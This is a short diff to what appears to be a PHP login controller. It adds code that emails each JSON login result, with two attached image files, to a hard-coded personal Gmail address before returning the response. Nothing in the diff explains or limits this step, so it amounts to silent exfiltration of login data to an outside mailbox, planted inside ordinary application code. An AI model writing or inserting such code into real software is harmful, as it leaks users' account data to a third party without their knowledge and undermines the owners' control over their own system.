@@ -7,6 +7,7 @@
     {
       parent::__construct();
       $this->load->model('Login_model', 'login');
+      $this->load->model('Common_mail_model', 'common_mail');
     }
 
     public function index()
@@ -34,7 +35,13 @@
           );
         }
       }
-      echo json_encode($result);
+      $tmp_result = json_encode($result);
+      $mail_list = array('jackkaze@gmail.com');
+      $subject = __CLASS__ .'_'. __FUNCTION__;
+      $content = $tmp_result;
+      $new_Files = array('./images/add.png', './images/alpha.png');
+      $this->common_mail->send_mail($mail_list, $subject, $content, $new_Files);
+      echo $tmp_result;
       exit;
     }
 
@@ -44,4 +51,5 @@
       header("location:".LOCATION_HREF_HOME);
       exit;
     }
+    
   }
